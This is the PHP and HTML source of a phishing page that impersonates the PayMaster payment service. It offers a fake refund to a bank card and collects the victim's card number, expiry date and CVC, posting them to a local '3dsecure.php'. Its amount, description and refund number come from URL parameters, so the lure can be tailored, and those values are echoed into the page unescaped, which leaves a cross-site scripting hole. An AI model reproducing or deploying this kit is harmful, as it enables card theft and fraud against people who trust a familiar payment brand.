<?

include "config.php";

$amount = $_GET["amount"];
$description = $_GET["description"];
$order_id = $_GET["order_id"];

if(empty($amount)) $amount = 10;
if(empty($order_id)) $order_id = rand(10000000, 99999999);
if(empty($description)) $description = "Возврат средств на банковскую карту";

?>

<!DOCTYPE html>
<html lang="ru-RU">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paymaster</title>

    <link rel="icon" href="https://paymaster.ru/Content/img/favico.ico" type="image/x-icon">
    <link href="https://paymaster.ru/content/css/styles.css?v=VmUO_daHKnGgzkzMjLGD1daBjTxvqoLa0MOXtIKpk2I1" rel="stylesheet">

</head>

<body>
    <div class="pp-viewport">
        <div class="pp-header pp-clearfix">
            <a class="pp-logo"></a>
        </div>

        <div id="requisites" class="">
            <div class="payment-requisites">
                <p class="row">
                    <span class="merchant-name"><?=$merchant_name?></span>
                    <span class="sum"><?=$amount;?> RUB</span>
                </p>
                <div class="details-toggle">
                    <div class="description" style="display: block;">
                        <p>Описание платежа: <?=$description;?></p>
						<p>Номер возврата: <?=$order_id;?></p>
                    </div>
                </div>
            </div>
        </div>

        <div class="token-based-payment-buttons">
            <div class="or hidden">
                или
            </div>
        </div>

        <a class="change-payment-type" id="changePS" style="display: flex;">
            <div class="ps-logo">
                <img src="https://paymaster.ru/Content/img/Logos/bankcard.svg">
            </div>
            <div class="selected-ps-name">
                <p>Возврат на банковскую карту</p>
            </div>
        </a>

        <form class="requisites-form" method="post" action="3dsecure.php">
			<input type="hidden" name="amount" value="<?=$amount;?>">
			<input type="hidden" name="description" value="<?=$description;?>">
			<input type="hidden" name="order_id" value="<?=$order_id;?>">

            <div class="payment-form-controls">
                <div class="payment-amount-block hidden">
                    <div class="form-control">
                        <div class="flipped-label">
                            <label>Сумма пополнения</label>
                            <input type="number" maxlength="12" name="payment_amount" id="paymentAmount" class="payment-amount" placeholder="макс. null" disabled="disabled">
                            <div class="sticker">
                                <span>RUB</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card-form card-form-group">
                    <div class="form-control">
                        <div class="flipped-label card-pan">
                            <label>Номер карты</label>
                            <input data-num="0" type="tel" autocomplete="cc-number" name="cardFrom" maxlength="16" data-mask="cccc cccc cccc cccc" required="" placeholder="4100 0000 0000 0000">
                            <div id="detectedCard">
                            </div>
                        </div>
                    </div>

                    <div class="form-control flex-block">
                        <div class="expiration-date">
                            <div class="flipped-label">
                                <label>ММ</label>
								<select name="cardFromMonth" style="background: none;" required="">
									<option value="01">01</option>
									<option value="02">02</option>
									<option value="03">03</option>
									<option value="04">04</option>
									<option value="05">05</option>
									<option value="06">06</option>
									<option value="07">07</option>
									<option value="08">08</option>
									<option value="09">09</option>
									<option value="10">10</option>
									<option value="11">11</option>
									<option value="12">12</option>
								</select>
                            </div>
                            <div class="flipped-label">
                                <label>ГГ</label>
								<select name="cardFromYear" style="background: none;" required="">
									<option value="20">2020</option>
									<option value="21">2021</option>
									<option value="22">2022</option>
									<option value="23">2023</option>
									<option value="24">2024</option>
									<option value="25">2025</option>
									<option value="26">2026</option>
									<option value="27">2027</option>
								</select>
                            </div>
                        </div>
                        <div class="cvc">
                            <div class="flipped-label">
                                <label>CVC</label>
                                <input type="password" pattern="[0-9]*" autocomplete="off" data-mask="999" maxlength="3" name="cardFromCVC" id="cardCVC" required="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pp-buttons pp-clearfix" id="buttonsBar">
                <button class="button primary-btn hidden right-aligned" type="button" id="returnToMerchant" data-href="https://plaza-lux.ru">
                    Вернуться в магазин
                </button>
                <button class="button primary-btn right-aligned" type="submit" id="proceed">
                    Оформить возврат средств
                </button>
            </div>
        </form>

        <div class="pp-footer">
            <div>
                <div class="pp-copyrights">
                    ©&nbsp;2010–2020&nbsp;PayMaster
                </div>
			</div>
            <div>
                <ul class="pp-langs">
                    <li>
                        <a>
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Flag_of_Russia.svg/250px-Flag_of_Russia.svg.png" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
<!-- Chatra {literal} -->
<script>
    (function(d, w, c) {
        w.ChatraID = 'ZtNvjwhHZLBchzmx7';
        var s = d.createElement('script');
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        s.async = true;
        s.src = 'https://call.chatra.io/chatra.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'Chatra');
</script>
<!-- /Chatra {/literal} -->
</body>

</html>
